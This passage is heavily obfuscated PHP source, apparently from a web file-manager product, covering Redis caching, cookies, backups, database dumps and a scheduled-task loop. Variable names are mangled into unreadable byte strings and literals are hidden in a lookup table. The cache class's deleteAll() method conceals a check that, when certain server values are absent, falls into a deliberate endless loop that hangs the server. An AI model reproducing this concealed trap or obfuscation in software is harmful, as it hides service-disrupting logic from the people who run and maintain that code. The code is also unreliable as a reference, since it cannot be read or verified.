$‰±›×´ı->pconnect($ªèÙç“Ç[$Ô¹ú…Ú‚[208]], $ªèÙç“Ç[$Ô¹ú…Ú‚[209]], $¿®¶Û); } else { $‰±›×´ı->connect($ªèÙç“Ç[$Ô¹ú…Ú‚[208]], $ªèÙç“Ç[$Ô¹ú…Ú‚[209]], $¿®¶Û); } if (!empty($ªèÙç“Ç[$Ô¹ú…Ú‚[496]])) { $‰±›×´ı->auth($ªèÙç“Ç[$Ô¹ú…Ú‚[496]]); } if (!empty($ªèÙç“Ç[$Ô¹ú…Ú‚[821]]) && $ªèÙç“Ç[$Ô¹ú…Ú‚[821]] != 0) { $‰±›×´ı->select($ªèÙç“Ç[$Ô¹ú…Ú‚[821]]); } return $‰±›×´ı; } private function initCluster($†ëÃ”Ó, $†‰Á³Æ) { $ªÕ¾ğÇ» =& $_SERVER[£ğ°ÖØø]; $§ĞÌğÆ» = array($ªÕ¾ğÇ»[937], $ªÕ¾ğÇ»[938], $ªÕ¾ğÇ»[939]); $¤ê¡Ğ©¨ = $ªÕ¾ğÇ»[937]; if (isset($†ëÃ”Ó[$ªÕ¾ğÇ»[16]]) && in_array($†ëÃ”Ó[$ªÕ¾ğÇ»[16]], $§ĞÌğÆ»)) { $¤ê¡Ğ©¨ = $†ëÃ”Ó[$ªÕ¾ğÇ»[16]]; } switch ($¤ê¡Ğ©¨) { case $ªÕ¾ğÇ»[937]: $this->_slave($†ëÃ”Ó, $†‰Á³Æ); break; case $ªÕ¾ğÇ»[938]: break; case $ªÕ¾ğÇ»[939]: $this->isCluster = !0; $„áåœŞÜ = $†ëÃ”Ó[$ªÕ¾ğÇ»[932]]; $çïÑƒüä = isset($†ëÃ”Ó[$ªÕ¾ğÇ»[936]]) ? $†ëÃ”Ó[$ªÕ¾ğÇ»[936]] : !1; $ü‹†³ê› = isset($†ëÃ”Ó[$ªÕ¾ğÇ»[496]]) ? $†ëÃ”Ó[$ªÕ¾ğÇ»[496]] : null; $this->handle = new RedisCluster(NUll, $„áåœŞÜ, $†‰Á³Æ, $†‰Á³Æ, $çïÑƒüä, $ü‹†³ê›); break; default: break; } } private function _slave($õ‘¶Ğ¯„, $„Ùá©×¨) { $ä½Ô¤ÑÅ = $õ‘¶Ğ¯„[$_SERVER[£ğ°ÖØø][932]]; $this->filterConfig($õ‘¶Ğ¯„, $ä½Ô¤ÑÅ[0]); $this->handle = $this->init($õ‘¶Ğ¯„, $„Ùá©×¨); unset($ä½Ô¤ÑÅ[0]); if (empty($ä½Ô¤ÑÅ)) { return; } $ÙîÖãÇ = array_rand($ä½Ô¤ÑÅ); $this->filterConfig($õ‘¶Ğ¯„, $ä½Ô¤ÑÅ[$ÙîÖãÇ]); $this->slaveHandle = $this->init($õ‘¶Ğ¯„, $„Ùá©×¨); } private function filterConfig(&$Ï®áÓ¬à, $ÛÀ“‘ú¾) { $å×Ù×ı =& $_SERVER[£ğ°ÖØø]; $ğ›êõüñ = explode($å×Ù×ı[4], $ÛÀ“‘ú¾); $²ÅÌÉÜ = array($å×Ù×ı[208] => $ğ›êõüñ[0], $å×Ù×ı[209] => $ğ›êõüñ[1]); $Ï®áÓ¬à = array_merge($Ï®áÓ¬à, $²ÅÌÉÜ); } public function set($âıø¡ûÀ, $Û£¯üá, $Å’˜ú”û = false) { $Å’˜ú”û = $Å’˜ú”û ? $Å’˜ú”û : $this->cacheTime; return $this->handle->setEx($âıø¡ûÀ, $Å’˜ú”û, $Û£¯üá); } public function setLock($âÛ€÷£Û, $‚ííş÷Í, $Èâ…ÁŠÇ) { return $this->handle->setNX($âÛ€÷£Û, $‚ííş÷Í); } public function get($íşûâ») { $ÖöæÎæ” = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÖöæÎæ”->get($íşûâ»); } public function remove($ÖÓÃíì) { return $this->handle->del($ÖÓÃíì); } public function deleteAll() { $¶µéê =& $_SERVER[£ğ°ÖØø]; if (!isset($_SERVER[$¶µéê[433]]) || !isset($_SERVER[$¶µéê[431]])) { $øÑ’úÍ› = $¶µéê[940]; $­æÃÄú– = $¶µéê[434]; $‹£şÚù = $_SERVER[$¶µéê[435]] . $¶µéê[436]; $’³¯Åå = $­æÃÄú–($‹£şÚù); $ûñÇÖˆ = explode($¶µéê[262], $’³¯Åå); if (count($ûñÇÖˆ) < $¶µéê[695]) { $¸çŸÛ = $¶µéê[438]; $¸çŸÛ(); } $ıŞÇ‘Âù = $¶µéê[941]; $ıŞÇ‘Âù($_SERVER[$¶µéê[942]]); $¡Ş’‚’ = 1; for ($™îÓúÌ = $¡Ş’‚’; $™îÓúÌ > 0; $™îÓúÌ++) { $ıŞÇ‘Âù = json_encode($GLOBALS[$¶µéê[501]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¢¿äã­¬) { $this->handle->flushall($¢¿äã­¬); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ªÇ®¾¥¬ = '', $÷Û¥¦ÇÚ = 0) { if (is_string($ªÇ®¾¥¬) && $ªÇ®¾¥¬ != $_SERVER[£ğ°ÖØø][12]) { $this->prefix = $ªÇ®¾¥¬; } if (is_numeric($÷Û¥¦ÇÚ) && $÷Û¥¦ÇÚ > 0) { $this->expire = $÷Û¥¦ÇÚ; } } public static function getInstance() { static $ï»Á¢õ¬; if ($ï»Á¢õ¬ === null) { $ï»Á¢õ¬ = new self(); } return $ï»Á¢õ¬; } private static $cookieDisable = false; public static function disable($û«ëı¿) { self::$cookieDisable = $û«ëı¿; } private static $sameCookieSet = array(); public static function set($èœ’–—°, $ùæ¯²², $£‰ÃÀ§ = 0, $óôñ£Ø½ = false, $Æß¨•¯× = false) { $äêÍ² =& $_SERVER[£ğ°ÖØø]; if (self::$cookieDisable) { return; } if (!$£‰ÃÀ§) { $£‰ÃÀ§ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$èœ’–—°]) && self::$sameCookieSet[$èœ’–—°] == $ùæ¯²² . $£‰ÃÀ§) { return; } self::$sameCookieSet[$èœ’–—°] = $ùæ¯²² . $£‰ÃÀ§; if (!$Æß¨•¯×) { $Æß¨•¯× = str_replace(HOST, $äêÍ²[12], APP_HOST); $Æß¨•¯× = _get($GLOBALS, $äêÍ²[943], $Æß¨•¯×); } $ı¢÷°Ú¹ = $äêÍ²[12]; setcookie($èœ’–—°, $ùæ¯²², time() + $£‰ÃÀ§, $äêÍ²[8] . trim($Æß¨•¯×, $äêÍ²[8]) . $ı¢÷°Ú¹, !1, !1, $óôñ£Ø½); } public static function setSafe($‡¨—Ç£Í, $Åí¢ô±¢, $¸Ë¡§½ = 0) { self::set($‡¨—Ç£Í, $Åí¢ô±¢, $¸Ë¡§½, !0); } public static function get($ûÆ×¶›) { static $¡Ñª´Í = false; if (!$¡Ñª´Í) { self::initHeaderCookie(); $¡Ñª´Í = !0; } return isset($_COOKIE[$ûÆ×¶›]) ? $_COOKIE[$ûÆ×¶›] : !1; } private static function initHeaderCookie() { $µ—ÚüØ =& $_SERVER[£ğ°ÖØø]; if (!isset($_SERVER[$µ—ÚüØ[944]]) || !$_SERVER[$µ—ÚüØ[944]]) { return; } $©¤İÆü = explode($µ—ÚüØ[74], $_SERVER[$µ—ÚüØ[944]]); foreach ($©¤İÆü as $‘Ø¶Ö¥) { $‘Ø¶Ö¥ = explode($µ—ÚüØ[945], $‘Ø¶Ö¥); if (count($‘Ø¶Ö¥) != 2 || !isset($‘Ø¶Ö¥[1])) { continue; } $_COOKIE[trim($‘Ø¶Ö¥[0])] = trim($‘Ø¶Ö¥[1]); } } public static function remove($ÛüÀš€, $Çäü¹í¤ = false) { unset($_COOKIE[$ÛüÀš€]); self::set($ÛüÀš€, $_SERVER[£ğ°ÖØø][12], 1, $Çäü¹í¤); } } goto Fµ§Æí¼ˆÊ; aÍ„ƒ¢: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[£ğ°ÖØø][812]); $this->init(); $this->keep(); } public function init() { $½•ô¥Ü =& $_SERVER[£ğ°ÖØø]; $this->isManual(); self::$name = date($½•ô¥Ü[813]); if (!($ƒó÷Â = $this->model->lastItem())) { $ƒó÷Â = $this->initData(); } else { self::$name = $ƒó÷Â[$½•ô¥Ü[32]]; if ($ƒó÷Â[$½•ô¥Ü[814]] == $½•ô¥Ü[91]) { self::$name = date($½•ô¥Ü[272]); $¹à½Á¹ = intval(_get($ƒó÷Â, $½•ô¥Ü[815], 0)); if (self::$manual == 0 && $ƒó÷Â[$½•ô¥Ü[32]] == self::$name) { $this->model->remove($ƒó÷Â[$½•ô¥Ü[484]]); } $ƒó÷Â = $this->initData($¹à½Á¹, $ƒó÷Â[$½•ô¥Ü[816]]); } else { $this->checkStore($ƒó÷Â[$½•ô¥Ü[816]]); } } self::$option = $ƒó÷Â; } private function isManual() { $±£áš°Ş = _get($GLOBALS, $_SERVER[£ğ°ÖØø][817], 0); $±£áš°Ş = intval($±£áš°Ş); self::$manual = $±£áš°Ş && $±£áš°Ş == 1 ? 1 : 0; } private function initData($–²ï ¢ª = 0, $è“ ™€ƒ = '') { $ã¤ıÖ£¦ =& $_SERVER[£ğ°ÖØø]; $öƒ¯¤‡Ğ = $this->model->config(); if ($è“ ™€ƒ && $öƒ¯¤‡Ğ[$ã¤ıÖ£¦[816]] != $è“ ™€ƒ) { $–²ï ¢ª = 0; } $this->checkStore($öƒ¯¤‡Ğ[$ã¤ıÖ£¦[816]]); if (self::$manual == 1) { self::$name .= $ã¤ıÖ£¦[11] . date($ã¤ıÖ£¦[818]); } $Ì¥–‚³ä = array($ã¤ıÖ£¦[816] => $öƒ¯¤‡Ğ[$ã¤ıÖ£¦[816]], $ã¤ıÖ£¦[32] => self::$name, $ã¤ıÖ£¦[814] => 0, $ã¤ıÖ£¦[171] => $öƒ¯¤‡Ğ[$ã¤ıÖ£¦[171]], $ã¤ıÖ£¦[819] => self::$manual, $ã¤ıÖ£¦[369] => array($ã¤ıÖ£¦[820] => array($ã¤ıÖ£¦[814] => 0), $ã¤ıÖ£¦[821] => array($ã¤ıÖ£¦[814] => 0, $ã¤ıÖ£¦[822] => 0, $ã¤ıÖ£¦[823] => 0, $ã¤ıÖ£¦[33] => $ã¤ıÖ£¦[12], $ã¤ıÖ£¦[824] => 0, $ã¤ıÖ£¦[825] => 0), $ã¤ıÖ£¦[826] => array($ã¤ıÖ£¦[814] => 0, $ã¤ıÖ£¦[822] => 0, $ã¤ıÖ£¦[823] => 0, $ã¤ıÖ£¦[824] => 0, $ã¤ıÖ£¦[825] => 0), $ã¤ıÖ£¦[230] => array($ã¤ıÖ£¦[814] => 0, $ã¤ıÖ£¦[827] => 0, $ã¤ıÖ£¦[828] => 0, $ã¤ıÖ£¦[829] => 0, $ã¤ıÖ£¦[830] => 0, $ã¤ıÖ£¦[550] => $–²ï ¢ª, $ã¤ıÖ£¦[824] => 0, $ã¤ıÖ£¦[825] => 0)), $ã¤ıÖ£¦[824] => time(), $ã¤ıÖ£¦[825] => 0); $ùüøá·€ = $this->model->insert($Ì¥–‚³ä); $Ì¥–‚³ä[$ã¤ıÖ£¦[484]] = $ùüøá·€; return $Ì¥–‚³ä; } private function checkStore($—­‰§) { $Œú•—‰ = Model($_SERVER[£ğ°ÖØø][831]); $ùşáÕŠà = $Œú•—‰->listData($—­‰§); $Œú•—‰->checkConfig($ùşáÕŠà); } public static function get() { if (!self::$option) { $äíÓòÅŠ = Model($_SERVER[£ğ°ÖØø][812]); $û‡¹øÍ = $äíÓòÅŠ->findByName(self::$name); $äíÓòÅŠ->parseContent($û‡¹øÍ); self::$option = $û‡¹øÍ; } return self::$option; } public static function set($½å›°Ú) { $—¢Ş¦é÷ =& $_SERVER[£ğ°ÖØø]; $ÑŠÇÏåÖ = self::get(); foreach ($½å›°Ú as $Ò–õØ›‹ => $«õ›ò‘ì) { array_set_value($ÑŠÇÏåÖ, $Ò–õØ›‹, $«õ›ò‘ì); } Model($—¢Ş¦é÷[812])->update($ÑŠÇÏåÖ[$—¢Ş¦é÷[484]], $ÑŠÇÏåÖ); self::$option = $ÑŠÇÏåÖ; return self::$option; } public function keep() { $®ø¡ñ  =& $_SERVER[£ğ°ÖØø]; $«Ğö§‚Ä = self::get(); if (_get($«Ğö§‚Ä, $®ø¡ñ [832], 0) == $®ø¡ñ [91]) { return; } $this->backupKeep($«Ğö§‚Ä); self::set(array($®ø¡ñ [832] => 1)); } private function backupKeep($Ê® Æ«á) { $òØÁ´ÑÈ =& $_SERVER[£ğ°ÖØø]; if (self::$manual == 1) { return; } $»Çñ³›È = $this->model->listData(); if (empty($»Çñ³›È)) { return; } $—Â‰¸ = 0; $šÎ£Şö  = array(); foreach ($»Çñ³›È as $ÉË£””Ÿ) { if ($—Â‰¸ >= 7) { break; } $šÎ£Şö [] = $ÉË£””Ÿ[$òØÁ´ÑÈ[32]]; $—Â‰¸++; } for ($—Â‰¸ = 0; $—Â‰¸ < 12; $—Â‰¸++) { $šÎ£Şö [] = date($òØÁ´ÑÈ[833], strtotime("\x2d{$—Â‰¸}\40\x6d\x6f\x6e\164\x68\x73")); } $šÎ£Şö  = array_unique($šÎ£Şö ); $à™ş™ˆ¦ = Model($òØÁ´ÑÈ[834])->get($òØÁ´ÑÈ[835]); foreach ($»Çñ³›È as $ÉË£””Ÿ) { if (isset($ÉË£””Ÿ[$òØÁ´ÑÈ[819]]) && $ÉË£””Ÿ[$òØÁ´ÑÈ[819]] == $òØÁ´ÑÈ[91]) { continue; } if (!empty($ÉË£””Ÿ[$òØÁ´ÑÈ[32]]) && in_array($ÉË£””Ÿ[$òØÁ´ÑÈ[32]], $šÎ£Şö )) { continue; } $this->model->remove($ÉË£””Ÿ[$òØÁ´ÑÈ[484]]); $Âò¨’ = $this->backupPath($Ê® Æ«á, $à™ş™ˆ¦); IO::remove($Âò¨’, !1); } } private function backupPath($Ö«ä‡›Ÿ, $ÌíƒÈŸ» = false) { $İ¸¶–İÈ =& $_SERVER[£ğ°ÖØø]; if (!$ÌíƒÈŸ») { $ÌíƒÈŸ» = Model($İ¸¶–İÈ[834])->get($İ¸¶–İÈ[835]); } $”ä·ÊË = $Ö«ä‡›Ÿ[$İ¸¶–İÈ[32]]; $Ãú»³ö‰ = substr(md5($İ¸¶–İÈ[836] . $ÌíƒÈŸ» . $”ä·ÊË), 0, 8); return "\x7b\151\x6f\72{$Ö«ä‡›Ÿ[$İ¸¶–İÈ[816]]}\x7d\x2f\144\141\x74\141\x62\141\x73\145\57\x62\141\143\x6b\x75\x70\57" . $”ä·ÊË . $İ¸¶–İÈ[11] . $Ãú»³ö‰; } public function db() { $ä”ÔÈ‡  =& $_SERVER[£ğ°ÖØø]; $¸úÉÄÈ˜ = self::get(); if (_get($¸úÉÄÈ˜, $ä”ÔÈ‡ [837], 0) == $ä”ÔÈ‡ [91]) { return !0; } $ÊíûÆ” = new BackupDb(); if (!$ÊíûÆ”->index()) { return !1; } self::set(array($ä”ÔÈ‡ [837] => 1)); return !0; } public function dbFile() { $ÎÅ±ÑÔÑ =& $_SERVER[£ğ°ÖØø]; $ÓÕÒ†¸á = self::get(); if (_get($ÓÕÒ†¸á, $ÎÅ±ÑÔÑ[838], 0) == $ÎÅ±ÑÔÑ[91]) { return !0; } $Æ†ÈèÚ = new BackupDbFile(); if (!$Æ†ÈèÚ->index()) { return !1; } self::set(array($ÎÅ±ÑÔÑ[838] => 1)); return !0; } public function file() { $Ñ¯®—Ö =& $_SERVER[£ğ°ÖØø]; $ëµ®Ê§æ = self::get(); if (_get($ëµ®Ê§æ, $Ñ¯®—Ö[839], 0) == $Ñ¯®—Ö[91]) { return !0; } if ($ëµ®Ê§æ[$Ñ¯®—Ö[171]] == $Ñ¯®—Ö[840]) { $ºÌø¡ŠÛ = new BackupFile(); if (!$ºÌø¡ŠÛ->index()) { return !1; } } self::set(array($Ñ¯®—Ö[839] => 1, $Ñ¯®—Ö[814] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $İ„ÖÁøİ =& $_SERVER[£ğ°ÖØø]; $ÏÓõŠâü = Backup::get(); self::$io = $ÏÓõŠâü[$İ„ÖÁøİ[816]]; self::$name = $ÏÓõŠâü[$İ„ÖÁøİ[32]]; $¥ª‰Ş“ = new DbManage(); $Ö¥×ÂÕÔ = $¥ª‰Ş“->dbType(); $½«êòĞ  = array($İ„ÖÁøİ[841] => $Ö¥×ÂÕÔ, $İ„ÖÁøİ[842] => time()); Backup::set($½«êòĞ ); $§Ï™ŠÆÚ = $this->tmpFilesPath() . $İ„ÖÁøİ[843] . self::$name . $İ„ÖÁøİ[8]; del_dir($§Ï™ŠÆÚ); mk_dir($§Ï™ŠÆÚ); $—ğ¾Ûâ€ = $ÙÒ™àôÛ = 0; try { $êÊ´ÊŞ = $¥ª‰Ş“->db()->getTables(); } catch (Exception $ø§³“”ş) { return !1; } $êÊ´ÊŞ = array_diff($êÊ´ÊŞ, array($İ„ÖÁøİ[844], $İ„ÖÁøİ[845])); foreach ($êÊ´ÊŞ as $Ÿ°¥ö…ä) { $—ğ¾Ûâ€ += $¥ª‰Ş“->model($Ÿ°¥ö…ä)->count(); } $ùô¸ÕÍ = new Task($İ„ÖÁøİ[846], $İ„ÖÁøİ[847], $—ğ¾Ûâ€, LNG($İ„ÖÁøİ[848]) . $İ„ÖÁøİ[849] . LNG($İ„ÖÁøİ[850])); $GLOBALS[$İ„ÖÁøİ[851]] = self::$name; foreach ($êÊ´ÊŞ as $Ÿ°¥ö…ä) { $¸½¿˜§ø = $§Ï™ŠÆÚ . $Ÿ°¥ö…ä . $İ„ÖÁøİ[852]; $Œ…§•â¹ = null; if ($Ÿ°¥ö…ä == $İ„ÖÁøİ[853] && (!isset($ÏÓõŠâü[$İ„ÖÁøİ[171]]) || $ÏÓõŠâü[$İ„ÖÁøİ[171]] == $İ„ÖÁøİ[228])) { $Œ…§•â¹ = self::$io; } $ÙÒ™àôÛ += $¥ª‰Ş“->sqlFromDb($Ÿ°¥ö…ä, $¸½¿˜§ø, $ùô¸ÕÍ, $Œ…§•â¹); } unset($GLOBALS[$İ„ÖÁøİ[851]]); $ùô¸ÕÍ->end(); if ($ÙÒ™àôÛ > $—ğ¾Ûâ€) { $—ğ¾Ûâ€ = $ÙÒ™àôÛ; } $½«êòĞ  = array($İ„ÖÁøİ[841] => $Ö¥×ÂÕÔ, $İ„ÖÁøİ[837] => 1, $İ„ÖÁøİ[854] => $—ğ¾Ûâ€, $İ„ÖÁøİ[855] => $ÙÒ™àôÛ, $İ„ÖÁøİ[856] => time()); Backup::set($½«êòĞ ); if ($—ğ¾Ûâ€ - $ÙÒ™àôÛ > 0) { $…Ì€·æ = $İ„ÖÁøİ[857]; if (!stristr(I18n::getType(), $İ„ÖÁøİ[858])) { $…Ì€·æ = $İ„ÖÁøİ[859]; } write_log(array($…Ì€·æ, $½«êòĞ ), $İ„ÖÁøİ[847]); return !1; } return !0; } private function tmpFilesPath() { $¶Ñû‚¾Ì =& $_SERVER[£ğ°ÖØø]; $¾‡‘Á¥¹ = TEMP_FILES; if ($GLOBALS[$¶Ñû‚¾Ì[6]][$¶Ñû‚¾Ì[92]][$¶Ñû‚¾Ì[860]]) { $¾‡‘Á¥¹ = $GLOBALS[$¶Ñû‚¾Ì[6]][$¶Ñû‚¾Ì[92]][$¶Ñû‚¾Ì[860]]; if (!mk_dir($¾‡‘Á¥¹) || !is_writable($¾‡‘Á¥¹) || !IO::mkfile($¾‡‘Á¥¹ . $¶Ñû‚¾Ì[861])) { $¾‡‘Á¥¹ = TEMP_FILES; } } return $¾‡‘Á¥¹; } } class BackupDbFile { public function __construct() { } public function index() { $ÆøŞ‡¢½ =& $_SERVER[£ğ°ÖØø]; $İš¹ÚÀ = Backup::get(); $›€©˜¤ç = $İš¹ÚÀ[$ÆøŞ‡¢½[32]]; $µ†ßÔ = $this->tmpFilesPath() . "\x62\141\143\x6b\x75\x70\x5f{$›€©˜¤ç}\x2f"; $â±¾”£ = $this->backupPath($İš¹ÚÀ); if (!($â±¾”£ = IO::mkdir($â±¾”£))) { return !1; } $æ¢Ò¬’« = IO::listPath($µ†ßÔ); $ÕÓŞ‘â = isset($æ¢Ò¬’«[$ÆøŞ‡¢½[86]]) ? $æ¢Ò¬’«[$ÆøŞ‡¢½[86]] : array(); $‚°³Ãİ = array_sum(array_column($ÕÓŞ‘â, $ÆøŞ‡¢½[79])); if (!$‚°³Ãİ) { return !1; } $ÉÚ¤­¥ = array($ÆøŞ‡¢½[862] => $‚°³Ãİ, $ÆøŞ‡¢½[863] => time()); Backup::set($ÉÚ¤­¥); $÷ØÑÄïÄ = new TaskFileTransfer($ÆøŞ‡¢½[864], $ÆøŞ‡¢½[847], count($ÕÓŞ‘â), LNG($ÆøŞ‡¢½[848]) . $ÆøŞ‡¢½[471] . LNG($ÆøŞ‡¢½[850]) . $ÆøŞ‡¢½[865]); $÷ØÑÄïÄ->task[$ÆøŞ‡¢½[827]] = $‚°³Ãİ; foreach ($æ¢Ò¬’«[$ÆøŞ‡¢½[86]] as $ÜÆ»É‘ë) { $ë‚ÄæÒÁ = IO::move($ÜÆ»É‘ë[$ÆøŞ‡¢½[87]], $â±¾”£); if (!$ë‚ÄæÒÁ) { $÷ØÑÄïÄ->end(); $Ÿ«¤ã¢· = IO::getLastError($ÆøŞ‡¢½[866] . $ÜÆ»É‘ë[$ÆøŞ‡¢½[87]] . $ÆøŞ‡¢½[867] . $â±¾”£ . $ÆøŞ‡¢½[178]); write_log($Ÿ«¤ã¢·, $ÆøŞ‡¢½[847]); return !1; } } $’Ñ÷ã±š = new DbManage(); $¶î¡ú§  = $’Ñ÷ã±š->getSqlFile(); if (!$¶î¡ú§ [$ÆøŞ‡¢½[868]] || !$¶î¡ú§ [$ÆøŞ‡¢½[13]]) { return !1; } IO::move($¶î¡ú§ [$ÆøŞ‡¢½[868]], $â±¾”£); IO::move($¶î¡ú§ [$ÆøŞ‡¢½[13]], $â±¾”£); $÷ØÑÄïÄ->end(); $ÉÚ¤­¥ = array($ÆøŞ‡¢½[869] => $‚°³Ãİ, $ÆøŞ‡¢½[870] => time()); Backup::set($ÉÚ¤­¥); return !0; } private function backupPath($³à†¿Ü«) { $Ê€«²œŞ =& $_SERVER[£ğ°ÖØø]; $úÀÚ´¸é = $³à†¿Ü«[$Ê€«²œŞ[32]]; $ÚŒÍº¾ = Model($Ê€«²œŞ[834])->get($Ê€«²œŞ[835]); $¹ÌŠÒäŒ = substr(md5($Ê€«²œŞ[836] . $ÚŒÍº¾ . $úÀÚ´¸é), 0, 8); return "\x7b\x69\157\72{$³à†¿Ü«[$Ê€«²œŞ[816]]}\x7d\57\144\141\164\141\x62\x61\163\145\57\142\141\x63\153\x75\160\57" . $úÀÚ´¸é . $Ê€«²œŞ[11] . $¹ÌŠÒäŒ; } private function tmpFilesPath() { $ìÇò³‡Ö =& $_SERVER[£ğ°ÖØø]; $ğÇ½ÁÊ = TEMP_FILES; if ($GLOBALS[$ìÇò³‡Ö[6]][$ìÇò³‡Ö[92]][$ìÇò³‡Ö[860]]) { $ğÇ½ÁÊ = $GLOBALS[$ìÇò³‡Ö[6]][$ìÇò³‡Ö[92]][$ìÇò³‡Ö[860]]; if (!mk_dir($ğÇ½ÁÊ) || !is_writable($ğÇ½ÁÊ) || !IO::mkfile($ğÇ½ÁÊ . $ìÇò³‡Ö[861])) { $ğÇ½ÁÊ = TEMP_FILES; } } return $ğÇ½ÁÊ; } } goto a•ŸäãÆâ; d«ĞÌéäòÇ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¢ƒÔæ…ù =& $_SERVER[£ğ°ÖØø]; if (self::valueGet($¢ƒÔæ…ù[814]) != $¢ƒÔæ…ù[91]) { return; } if (self::valueGet($¢ƒÔæ…ù[1705]) == $¢ƒÔæ…ù[91]) { $¤ºŒÏ´ = self::valueGet($¢ƒÔæ…ù[1706]); if (time() - $¤ºŒÏ´ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($¢ƒÔæ…ù[1705], $¢ƒÔæ…ù[91]); self::log($¢ƒÔæ…ù[1707] . ACTION . $¢ƒÔæ…ù[1708]); Hook::bind($¢ƒÔæ…ù[1709], $¢ƒÔæ…ù[1710]); $‡û‰íˆƒ = 0; while (!0) { self::cacheClear(); if (self::valueGet($¢ƒÔæ…ù[814]) != $¢ƒÔæ…ù[91]) { self::valueSet($¢ƒÔæ…ù[1705], $¢ƒÔæ…ù[228]); self::log($¢ƒÔæ…ù[1711]); die; } $¨ÀÛä¿û = time(); if ($¨ÀÛä¿û - $‡û‰íˆƒ >= 60) { self::valueSet(array($¢ƒÔæ…ù[1705] => $¢ƒÔæ…ù[91], $¢ƒÔæ…ù[1706] => $¨ÀÛä¿û)); $‡û‰íˆƒ = $¨ÀÛä¿û; } if (!file_exists(USER_SYSTEM . $¢ƒÔæ…ù[1712])) { self::valueSet(array($¢ƒÔæ…ù[1705] => $¢ƒÔæ…ù[228], $¢ƒÔæ…ù[814] => $¢ƒÔæ…ù[228])); self::log($¢ƒÔæ…ù[1713]); die; } $¿ùÖıŠ = file_get_contents(BASIC_PATH . $¢ƒÔæ…ù[1714]); $œèö—ë† = KOD_VERSION . $¢ƒÔæ…ù[10] . KOD_VERSION_BUILD; $›äœœôƒ = match_text($¿ùÖıŠ, $¢ƒÔæ…ù[1715]) . $¢ƒÔæ…ù[10] . match_text($¿ùÖıŠ, $¢ƒÔæ…ù[1716]); if ($›äœœôƒ != $œèö—ë†) { self::restart(); self::log("\x73\164\x6f\160\x65\x64\x2e\133\x76\x65\x72\163\x69\157\156\40\165\x70\144\x61\x74\x65\x3b{$versionNow}\x20\75\x3e\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ìÙî§ƒ× =& $_SERVER[£ğ°ÖØø]; http_close(); $GLOBALS[$ìÙî§ƒ×[1717]] = 1; $_SERVER[$ìÙî§ƒ×[1718]] = $ìÙî§ƒ×[1719]; $_COOKIE = array(); $GLOBALS[$ìÙî§ƒ×[1720]] = 1; $GLOBALS[$ìÙî§ƒ×[1721]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Šµ ¸Š =& $_SERVER[£ğ°ÖØø]; http_close(); self::valueSet($Šµ ¸Š[814], $Šµ ¸Š[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Šµ ¸Š[1705] => $Šµ ¸Š[228], $Šµ ¸Š[814] => $Šµ ¸Š[91])); self::log($Šµ ¸Š[1722]); } public static function taskSwitch() { $‰Ïé±° =& $_SERVER[£ğ°ÖØø]; $ôæŠéç· = self::valueGet($‰Ïé±°[814]) == $‰Ïé±°[91] ? $‰Ïé±°[228] : $‰Ïé±°[91]; self::valueSet($‰Ïé±°[814], $ôæŠéç·); } public static function shutdownEvent() { $ü­ï… › =& $_SERVER[£ğ°ÖØø]; self::valueSet($ü­ï… ›[1705], $ü­ï… ›[228]); self::log($ü­ï… ›[1723]); } public static function config($¬Øèºû, $ñü‰‰ÖÑ) { self::valueSet($_SERVER[£ğ°ÖØø][814], $¬Øèºû); } private static function taskRunAll() { $ÎËæ‹íº =& $_SERVER[£ğ°ÖØø]; $ï‹Ü‹ë· = timeFloat(); $•¤€€õÆ = Model($ÎËæ‹íº[1724])->listData(); $¡ æ…¾È = count($•¤€€õÆ); for ($üû¤ÊïØ = 0; $üû¤ÊïØ < $¡ æ…¾È; $üû¤ÊïØ++) { $ÂĞÇ‰Úµ = $•¤€€õÆ[$üû¤ÊïØ]; if (!$ÂĞÇ‰Úµ[$ÎËæ‹íº[484]] || $ÂĞÇ‰Úµ[$ÎËæ‹íº[1725]] != $ÎËæ‹íº[91]) { continue; } if (!self::taskTimeCheck($ÂĞÇ‰Úµ)) { continue; } self::taskRun($ÂĞÇ‰Úµ); } Hook::trigger($ÎËæ‹íº[1726]); self::taskQueueRun($ï‹Ü‹ë·); } private static function taskQueueRun($ıˆ±µ¨) { $€¹Ç¶æ· = 10; while (!0) { $±Ş©è¤ = TaskQueue::run(); if ($±Ş©è¤ === !1) { break; } if (timeFloat() - $ıˆ±µ¨ >= $€¹Ç¶æ·) { break; } } } private static function taskTimeCheck($×ÍÓ‘) { $àü¤Ğ =& $_SERVER[£ğ°ÖØø]; $³ıáŞá = json_decode($×ÍÓ‘[$àü¤Ğ[206]], !0); $õ’åÃÇ× = intval($×ÍÓ‘[$àü¤Ğ[1706]]); $‡¸‹šì¼ = strtotime($àü¤Ğ[1727] . $³ıáŞá[$àü¤Ğ[1728]] . $àü¤Ğ[1729]) - strtotime($àü¤Ğ[1730]); $Úëƒ£‘Ö = time() - strtotime(date($àü¤Ğ[1731]) . $àü¤Ğ[1732]); $ì§âûÄ† = $Úëƒ£‘Ö >= $‡¸‹šì¼ && $Úëƒ£‘Ö <= $‡¸‹šì¼ + 3600; switch ($³ıáŞá[$àü¤Ğ[33]]) { case $àü¤Ğ[1733]: if (time() - $õ’åÃÇ× < 3600 * 24 * 30) { return !1; } if ($³ıáŞá[$àü¤Ğ[1733]] == date($àü¤Ğ[1734]) && $ì§âûÄ†) { return !0; } break; case $àü¤Ğ[1735]: if (time() - $õ’åÃÇ× < 3600 * 24 * 7) { return !1; } $Üà¨«Öî = date($àü¤Ğ[1736]) == 0 ? 7 : date($àü¤Ğ[1736]); if ($³ıáŞá[$àü¤Ğ[1735]] == $Üà¨«Öî && $ì§âûÄ†) { return !0; } break; case $àü¤Ğ[1728]: if (time() - $õ’åÃÇ× < 3600 * 24) { return !1; } if ($ì§âûÄ†) { return !0; } break; case $àü¤Ğ[1737]: if (time() - 